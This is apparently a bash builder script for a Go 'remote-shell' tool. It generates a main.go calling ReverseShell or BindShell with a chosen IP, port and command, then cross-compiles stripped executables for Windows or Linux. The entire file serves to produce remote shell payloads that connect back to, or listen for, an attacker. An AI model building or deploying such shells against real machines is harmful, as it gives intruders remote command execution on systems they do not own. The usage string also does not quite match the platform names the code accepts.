#!/bin/bash

_usage="Usage: $0 linux|windows[32|64] bind|reverse ip port command [argument1 [argument2 [argumentN]]"

_base="
package main
\nimport \"remote-shell/src/Modes\"
\nfunc main(){
\n\tModes."

prepare_main_file(){
	func_parameters="(\"$2:$3\", \"$4\","
	if [ $# -gt 4 ]
	then
		number_of_arguments=$(($# - 4))
		func_parameters+=" []string{"
		for number in $(seq 1 $number_of_arguments)
		do
			index=$((number+4))
			func_parameters+="\"${!index}\""
			if [ $number != $number_of_arguments ]
			then
				func_parameters+=", "
			else
				func_parameters+="})"
			fi
		done
	else
		func_parameters+=" nil)"
	fi
	if [ "$1" == "reverse" ]
	then
		echo -e "$_base""ReverseShell$func_parameters\n}" > main.go
	elif [ "$1" == "bind" ]
	then
		echo -e "$_base""BindShell$func_parameters\n}" > main.go
	else
		echo "Modes available: reverse, bind"
	fi
}

main(){
	current_directory=$(pwd)
	cd "$(dirname $0)"
	if [ $# -lt 5 ]
	then
		echo  "$_usage"
		return
	fi

	result=$(prepare_main_file "${@:2}")
	if [ "$result" == "Modes available: reverse, bind" ]
	then
		echo "$result"
	fi

	if [ "$1" == "windows64" ]
	then
		GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o "$current_directory"
	elif [ "$1" == "windows32" ]
	then
		GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o "$current_directory"
	elif [ "$1" == "linux64" ]
	then
		GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$current_directory"
	elif [ "$1" == "linux32" ]
	then
		GOOS=linux GOARCH=386 go build -ldflags="-s -w" -o "$current_directory"
	else
		echo "$_usage"
		return
	fi
	echo "Shell compiled"
}

main "$@"
